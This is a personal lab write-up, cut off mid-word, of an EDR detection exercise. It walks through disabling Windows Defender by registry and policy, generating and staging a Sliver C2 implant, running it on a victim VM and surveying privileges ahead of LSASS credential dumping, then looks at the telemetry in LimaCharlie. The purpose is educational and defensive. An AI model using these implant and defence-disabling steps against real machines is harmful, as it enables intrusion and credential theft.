## LimaCharlie EDR SOC Lab
(use this section with a picture or an introduction to the topic)

## Introduction
In this project, based on the excellent articles from (Eric Capuano), I will simulate real-life cyber attacks on a victim VM, monitor the traffic and activity & finally look to take containment and remediation actions to ensure the attacks are halted. The environment required for this simulation was a Windows 11 machine (Victim) and Ubuntu Server 22.04 (Attack) configured on VMware Workstation 11. 

The Windows 11 machine was configured with Sysmon to monitor and log system activity. This was then filtered into LimaCharlie EDR with their sensor installed on the machine, which allowed visualisation of the simulated attacks through their dashboard (and later on containment and remediation but we'll get onto that). 

The Ubuntu Server, used as the attack machine, would have Sliver-Server C2 installed, which is an 'open source cross-platform adversary emulation / red-team framework' which would allow me to conduct specific activities common with cybercriminals. This activity would specifically look into Credential Gathering techniques, aiming to gather the usernames and passwords in LSASS.exe.     

I will look to conduct a C2 attack against the victim machine, check through the telemetry to confirm the presence of the attack, and then finally look to create 'Detection & Response' rules.

I'd like to take the time now to credit (Eric Capuano) for writing this excellent blog post which was followed for this project. This project was only used for personal educational purposes. 

## PART 1
The first step was to set up the two virtual environments required. Having already installed and used VMware Workstation 11 for previous labs I could import the required .ISO & .OVF files. The Windows machine would be pre-configured so we can head straight over to our Ubuntu Server, which would take some configuration. The below screenshot shows the static IP address set for Ubuntu Server. This was configured by taking the gateway IP & subnet IP of the VMware Workstation NAT network. By executing this we ensure that the IP will remain the same throughout the lab as we will be required to SSH into the Ubuntu Server at a later date. 

<img width="663" alt="Screenshot 2023-06-08 055214" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/e7986d80-e1f2-423d-b039-ce8114ad0ddf">

Now that we have both machines up and running with our specific configurations we'll jump over to the Windows machine to disable some features in Windows Defender permanently, to allow us to conduct our credential-gathering with Sliver-Server later on. First of all, head over to Windows Security and disable all settings under 'Virus & Threat Protection' which includes Real-time Protection, Cloud-delivered Protection, Automatic Sample Submission and Tamper Protection (when turned on, prevents others from tampering with important security features, highlighted in the screenshot below)

<img width="423" alt="Screenshot 2023-06-08 162738" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/1db37d05-744c-4601-95ba-7c302edddf50">

Next, we'll head over to Group Policy Editor and permanently disable Defender by turning off Microsoft Defender Antivirus. After, we'll look to achieve the same goal in Registry via an administrative command prompt (screenshot below)

<img width="462" alt="Screenshot 2023-06-08 164023" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/65d9b7a9-838c-4bf7-a6b9-284d952516db">

Now, we'll Safe Boot (minimal) our Windows machine and when restarted we'll disable some more specific services via the Registry. We'll make our way into Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services to change the value to 4 (Log to a database disabled) of 6 keys including; Sense, WdBoot, WinDefend, WdNisDrv, WinNisSvc and WdFilter. (screenshot below). The final configuration change we'll make is to prevent the Windows machine from going to standby via our administrative command prompt. 

<img width="521" alt="Screenshot 2023-06-08 164857" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/650bdd0c-1c52-4c6c-a764-c8ad0ac18745">

Now, with the Windows machine finely tuned and ready to go, we're going to install Sysmon which gives us more granular telemetry from the Windows endpoint than just LimaCharlie EDR would alone. We'll head over to an administrative Powershell, download and unzip Sysmon and then we'll look to use SwiftOnSecuirty's Sysmon Config [insert link], which the author describes as a 'Microsoft Sysinternals Sysmon configuration file template with high-quality event tracing'. This will help with the telemetry feeding into LimaCharlie. After a quick validation that the service is installed and running, and for the presence of Sysmon Event Logs we can move our attention on to the installation and configuration of LimaCharlie EDR. 


<img width="580" alt="Screenshot 2023-06-08 170336" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/77207bd3-d0a7-4edf-82c5-575c01f02444">

LimaCharlie EDR [possibly a link] is a SIaaS product with free and paid tiers is 'cybersecurity middleware that gives you full control and visibility over your security posture' the company states on their homepage. Whilst logged on the Windows machine and after a simple signup process, we'll look to install their sensor on the machine. Instead of following the step-by-step installer, we'll skip step two, head over to an Administrative Powershell  'cd' into the Downloads file and run 'Invoke-WebRequest -Uri [https://downloads.limacharlie.io/sensor/windows/64] -Outfile C:\Users\User\Downloads\lc_sensor.exe'. After we can fire up a command prompt and start at step 4 which gives us a specific command to copy and paste. This should complete the installation of the LimaCharlie sensor validated on the command line and in the LimaCharlie GUI. (See screenshot below)

<img width="577" alt="Screenshot 2023-06-08 172520" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/d99b3d7b-d0b9-44be-b264-b42fbdbe4746">

Next, we'll have to configure LimaCharlie to import the Sysmon Event Logs parallel to its native telemetry. This is done via the 'Artifact Collection' tab within LimaCharlie with a small amount of configuration shown below 

<img width="573" alt="Screenshot 2023-06-09 071924" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/d8372acb-12e1-4777-851e-261bc0478fc6">

The last section of Part 1 is setup Sliver-Server on our Ubuntu machine. To do this, we'll SSH into the Ubuntu machine (using the static IP address configured earlier on) and drop into a root shell. Next, we'll download the Sliver Linux Server binary, make it executable and install mingw-w64 for some additional capabilities for our attacks later on. Finally, we'll create a working directory with the command mkdir -p /opt/sliver to use for future steps.

## PART 2

Firstly in Part 2, we're going to generate our C2 payload in Sliver. After launching Sliver-Server, we'll use the command generate --http [192.168.52.101] --save. This will save our implant in the working directory created in Part 1 with a randomly generated name as a .exe file. To confirm the new implant has been configured using the command implant. To confess, I had a problem the first time around with this step. I believe I generated my first implant outside of a root shell and therefore encountered issues with dumping the lsasss.exe process later on. Therefore, some of the screenshots will generate different names for the above .exe files (EXTREME_FILE.exe & EVOLUTIONARY_SOOT.exe). 

<img width="256" alt="Screenshot 2023-06-12 162600" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/5da99195-a463-4525-8547-888ce20d9b80">

For now, we're done with Sliver-Server so we'll exit the process. Now we need to download the C2 payload onto our Windows machine. Adversaries will find a multitude of different methods to deliver malware like phishing emails or unsuspecting malicious links for example, but for the lab, we'll simply run the command python3 -m http.server 80 to start a temporary web server. Next, we'll swap back into the Windows machine and download our C2 payload which is now staged and ready to exploit. This would now be a good time to snapshot the Windows machine. 

Following the staging of our malware, we can head over to the SSH session of our Ubuntu machine, terminate the Python web server and relaunch Sliver. To start the session on Sliver, you'll need to start the Sliver HTTP listener with the simple command of 'http', head back to the Windows machine, and execute the C2 payload from an administrative PowerShell. When you head back over to the Ubuntu SSH session this should appear in Sliver. You can verify the payload has been executed correctly by the command 'sessions' and seeing the green 'ALIVE' in the health tab. (see screenshot below)

<img width="249" alt="Screenshot 2023-06-12 164015" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/71514afd-0f99-405a-b01c-d578fbd913c3">

We will now look to interact with our C2 session using the command 'use [session id]' found previously in the 'sessions' command. This means we are interacting with the Windows machine via our C2 payload. We can verify this with basic commands like 'info' and 'whoami'. 'getprivs' will display the privileges available to us. Some of the privileges will interest us, particularly 'SeDebugPrivilege' which is enabled. Chen, R (2008) via Microsoft's website explains 'from a security perspective, SeDebugPrivilege is equivalent to administrator' making our future credential gathering much easier in the future. 

<img width="496" alt="Screenshot 2023-06-12 164136" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/ba808f44-5072-497b-88cb-c7a986fe71a2">

<img width="498" alt="Screenshot 2023-06-12 164208" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/2ce1cdc6-5979-4cff-9c4f-95aa358d7e7b">

We'll continue to identify the characteristics of the Windows machine with more commands. 'pwd' will display the working directory and 'netstat' will allow us to investigate the network connections. 

<img width="497" alt="Screenshot 2023-06-12 164245" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/7b873640-9d80-48a2-9cf0-b9870468426f">

<img width="492" alt="Screenshot 2023-06-12 164335" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/5e8441f6-58e2-4ab4-826c-b639d4d25cca">

Finally, we'll run 'ps -T' to highlight the running processes on our Windows machine. It should be noted (displayed in the screenshot below) that Sliver-Server will highlight defensive processes in red (like Sysmon) alongside displaying the security products any attacker will need to be aware of or navigate around next to a yellow warning sign. It will also highlight its native process i.e. our C2 implant in green. These actions should trigger some telemetry in LimaCharlie, so now we can head over to our EDR solution. 

<img width="492" alt="Screenshot 2023-06-12 164431" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/dc5abab7-b8b4-48b4-abb4-2daa494f8079">

[Writing this at 5:30 am so triple proofread]

When in the GUI for LimaChalrie, there are various places we can be investigating for suspicious activity. The 'sensors' tab allows us to view all deployed sensors, having only one for this demonstration we'll head there. Within our Windows sensor, we can start to do some investigating. Firstly, the 'Processes' tab will display all running processes, alongside whether the process has a valid signature. You'll notice all of the native Windows processes but under closer inspection, you'll obverse the C2 implant running without a valid signature and destination IP address in which the process is communicating, creating our first indicator of compromise.

As a side note, for security analysts, it is critically important to understand what is normal, in order to understand when something is abnormal and potentially malicious. However, it should be considered that malicious processes are able to use trusted, pre-installed system tools and processes. [LOLBINS] is a helpful tool which can help us identify how malware uses said trusted tools and processes by displaying the binary, functions, type and ATT&CK techniques. Some of the capabilities of this technique include; DLL hijacking, process dumping & hiding payloads to name a few. 

Jumping back into LimaCharlie, we can further validate this by heading to the 'Network' tab (see screenshot below). We are able to view the network connections for the running processes, including (if we search for it) our C2 payload and the IP addresses it's communicating with.

<img width="798" alt="Screenshot 2023-06-12 164910" src="https://github.com/wellblackjack/wellblackjack/assets/125303146/4ea0256c-659a-46c2-9a4b-4cf218af5d59">

 We can also use the 'File System' tab to inspect remote machines. As we planted the C2 payload we know exactly where to look in C:\Users\User\Downloads (CONTU




